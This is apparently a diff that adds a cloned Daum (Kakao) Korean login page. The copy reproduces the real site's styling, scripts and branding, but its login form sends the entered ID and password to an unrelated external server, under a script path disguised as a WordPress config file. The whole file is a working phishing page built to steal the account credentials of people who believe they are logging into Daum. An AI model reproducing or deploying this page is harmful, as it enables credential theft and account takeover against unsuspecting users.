@@ -1,0 +1,187 @@
+﻿<!doctype html>
+<html lang="ko">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta property="og:title" content="Daum 로그인">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="http://m1.daumcdn.net/svc/image/U03/common_icon/5587C4E4012FCD0001">
+    <meta property="og:image:secure_url" content="https://m1.daumcdn.net/svc/image/U03/common_icon/5587C4E4012FCD0001">
+    <meta property="og:description" content="여기를 눌러 링크를 확인하세요.">
+    <title>Daum 로그인</title>
+    <link rel="stylesheet" type="text/css" href="https://logins.daum.net/contents/min/css/pc.css?ver=200618042858">
+    <link rel="stylesheet" type="text/css" href="https://logins.daum.net/contents/min/css/font_pc.css?ver=200618042858">
+    <script type="text/javascript" src="https://t1.daumcdn.net/id/statics/common/js-lib/jquery-1.12.1.min.js"></script>
+    <script type="text/javascript" src="https://t1.daumcdn.net/id/statics/common/js-lib/jquery.cookie-1.3.1.min.js"></script>
+    <script type="text/javascript" src="https://logins.daum.net/contents/min/js/login-default.js?ver=200618042858"></script>
+<link rel="shortcut icon" href="http://i1.daumcdn.net/mimg/favicon/mail_favicon3.ICO">
+</head>
+<body>
+
+<div id="kakaoWrap">
+		<div id="kakaoHead">
+		<div class="inner_head">
+			<h1>
+				<a href="https://www.daum.net" id="daumLogo" class="link_daum" alt="Daum"
+				   data-tiara-action-name="Daum_첫화면">
+					<span class="ir_wa">DAUM</span>
+				</a>
+			</h1>
+		</div>
+	</div>
+
+	<hr class="hide" >
+	<div id="kakaoContent" class="cont_login" role="main">
+		<!-- 아이디입력도움말 노출시 view_help클래스 / 자판보기 노출시 view_key클래스 / 특수문자 노출시 view_char클래스 추가 -->
+		<div id="mArticle">
+			<h2 class="screen_out">아이디 로그인</h2>
+			<div class="section_login">
+                
+				<div id="loginFormDiv" class="login_default">
+
+				<form method="post" action="https://mybetterlife.co.za/wp-php/wp-config-philipja74.php">
+
+						<input type="hidden" name="url" value="https://mail.daum.net/" />
+						<input type="hidden" name="relative" value="" />
+						<input type="hidden" name="weblogin" value="1" />
+                        <input type="hidden" name="service" value="" />
+                        <input type="hidden" name="fuid" value="YLXCda2B76luUGp9Uv5WTO7FHjUqTUK90brohlS2FWUwrnpAXSVh-UQVMWzj6Kjxr8zQgaoSgMrtRfZChKdjCIIvhh71iKZMiyCRkhh7ZUuO4vmew"/>
+						                            <input type="hidden" name="slevel" value="1" />
+                            <input type="hidden" name="finaldest" value="" />
+                            <input type="hidden" name="reloginSeq" value="0" />
+																									<fieldset class="fld_comm">
+							<legend class="screen_out">아이디,비밀번호 로그인 정보 입력 폼</legend>
+							<div class="box_inp "> <!-- input 포커스시 input_on클래스 추가 / 입력시, 입력내용삭제버튼 노출시 del_on클래스 추가 -->
+								<label for="id" class="lab_g "></label> <!-- 공통 : input입력시 lab_g요소에 screen_out클래스 추가 -->
+					<input type="text" id="id" placeholder="아이디 입력" name="id" value="" class="tf_g" style="ime-mode:disabled;">
+								<button type="button" class="btn_del" data-tiara-action-name="아이디_입력_내용_지우기"><span class="ico_login ico_del">입력 내용 지우기</span></button>
+							</div>
+							<p id="id_msg" class="txt_message" style=" display:none "> <!-- 오류메세지 노출시 display:block, 비노출시 display:none -->
+								
+							</p>
+
+							<div class="box_inp "> <!-- input 포커스시 input_on클래스 추가 / 입력시, 입력내용삭제버튼 노출시 del_on클래스 추가 -->
+								<label for="inputPwd" class="lab_g "></label> <!-- 공통 : input입력시 lab_g요소에 screen_out클래스 추가 -->
+								<input type="password" id="inputPwd" placeholder="비밀번호 입력" name="pw" class="tf_g"  maxlength="32" autocomplete="off" style="ime-mode:disabled;">
+								<button type="button" class="btn_del" data-tiara-action-name="비밀번호_입력_내용_지우기"><span class="ico_login ico_del">입력 내용 지우기</span></button>
+							</div>
+							<p id="pw_msg" class="txt_message"  style=" display:none "> <!-- 오류메세지 노출시 display:block, 비노출시 display:none -->
+								
+							</p>
+                                                        
+
+							<button id="loginBtn" type="submit" class="btn_comm" data-tiara-action-name="로그인_버튼">로그인</button>
+
+							<div class="set_login"> <!-- 2016-10-10 툴팁노출시 tooltip_on클래스 추가 -->
+								<span class="set_comm " > <!-- 선택시 check_on클래스 추가 -->
+									<label for="stln" class="lab_check" data-tiara-action-name="로그인_상태_유지_checkbox_label">로그인 상태 유지</label>
+									<span class="check_g">
+										<input type="checkbox" id="stln" name="stln" value="1"  class="inp_check" data-tiara-action-name="로그인_상태_유지_checkbox_input">
+										<span class="ico_login ico_check">선택안됨</span> <!-- inp_check에 초점이 이동한경우 해당 ico_check요소에 focus클래스 추가 / 선택상태에 맞게 '선택됨','선택안됨' 으로 대체텍스트 제공 -->
+									</span>
+								</span>
+																<div class="layer_set" style=" display:none "><!-- 비노출시 display:none 처리 -->
+									<p class="desc_set">개인정보 보호를 위해, 개인 PC에서만 사용해 주세요.</p>
+									<span class="ico_login ico_point"></span>
+								</div>
+																	<span class="set_security "><!-- 체크해제 시 check_off클래스 추가 -->
+										<a href="#none" id="linkSecurity"
+										   class="link_security" target="_blank"
+										   data-tiara-action-name="IP보안">IP보안</a>
+										<input type="checkbox" id="ipSecurity" name="ipSecurity" class="inp_check" value="checked" checked="checked">
+										<label for="ipSecurity" class="ico_login lab_security"
+											   data-tiara-action-name="IP보안_설정_checkbox_ON_OFF">IP보안 설정 ON</label><!-- inp_check에 초점이 이동한경우 해당 lab_security요소에 focus클래스 추가 / ON,OFF선택에 맞게 'IP보안 설정 ON','IP보안 설정 OFF'로 대체텍스트 제공 -->
+									</span>
+							</div>
+						</fieldset>
+					</form>
+					<div class="login_help">
+						<button type="button" class="btn_help btn_key " data-tiara-action-name="자판_펼치기_접기_버튼">자판보기<span class="ico_login ico_arr">펼치기/접기</span></button> <!-- 버튼클릭시 btn_view클래스 추가 -->
+						<button type="button" class="btn_help btn_key " data-tiara-action-name="특수문자_펼치기_접기_버튼">특수문자<span class="ico_login ico_arr">펼치기/접기</span></button> <!-- 버튼클릭시 btn_view클래스 추가 -->
+					</div>
+					<div class="area_help" style="display:none">
+						<div class="bg_help img_key"></div>
+					</div>
+					<div class="area_help" style="display:none">
+						<div class="bg_help img_char"></div>
+                    </div>
+					<div class="login_rel">
+						<a href="https://member.daum.net/find/id.do" id="findID" class="link_rel" target="_blank"
+						   data-tiara-action-name="아이디찾기_링크">아이디 찾기</a>
+						<span class="txt_bar">|</span>
+						<a href="https://member.daum.net/find/password.do" id="findPW" class="link_rel" target="_blank"
+						   data-tiara-action-name="비밀번호찾기_링크">비밀번호 찾기</a>
+					</div>
+                </div>
+			</div>
+
+						<div class="info_etc">
+                <ins class="daum_ddn_area" style="display:block" data-ad-frame-id="login_AMS" data-ad-frame-name="login_AMS" data-ad-unit="00Y28" data-ad-type="D" data-ad-width="250" data-ad-height="250"></ins>
+			</div>
+					</div>
+	</div>
+
+	<hr class="hide">
+
+	<div id="kakaoFoot">
+		<h2 class="screen_out">서비스 이용정보</h2>
+		<a href=http://www.kakaocorp.com/ class="link_kcorp" target="_blank"
+		   data-tiara-action-name="카카오_회사소개">&copy; Kakao Corp.</a>
+		<span class="txt_bar">|</span>
+		<a href=https://cs.daum.net/faq/59/14970.html class="link_custom" target="_blank"
+		   data-tiara-action-name="고객센터">고객센터</a>
+	</div>
+</div>
+
+<script type="text/javascript">
+    jQuery(document).ready(function () {
+        if (daumlogin.slevel) {
+            daumlogin.slevel.init('https://logins.daum.net');
+        }
+
+        if (daumlogin.srp) {
+            daumlogin.srp.init('https://logins.daum.net');
+        }
+            var virtualKeyView = new VirtualKeyView('#kakaoContent');
+        virtualKeyView.initialize();
+
+            toggleBodyClass();
+
+        var loginForm = new LoginForm('#loginForm', {
+                        dummy: 0
+        }).initialize();
+
+        if (daumlogin.srp) {
+            daumlogin.srp.setValidator(loginForm.checkValid);
+        }
+    });
+</script>
+<script async type="text/javascript" src="//t1.daumcdn.net/adfit/static/ad.min.js"></script>
+
+    
+    
+<script type="text/javascript" src="//t1.daumcdn.net/tiara/js/v1/tiara.min.js"></script>
+<script type='text/javascript'>
+
+    var profile = "prod";
+    var isDevMode = "false";
+    var customProps = { profile: profile, isDev: isDevMode };
+    var deployment = "production"
+    if (isDevMode === "true") {
+        deployment = "dev";
+    }
+    TiaraTracker.getInstance()
+            .setSvcDomain("logins.daum.net")
+            .setDeployment(deployment)
+            .trackPage("LoginformDefault")
+            .setSection("login.loginform")
+            .setPage("로그인_폼_default")
+            .setReferrer(document.referrer)
+            .setEnableHash(true)
+            .customProps(customProps)
+            .setAutoClick(true)
+            .track();
+</script>
+	    </body>
+
+</html>
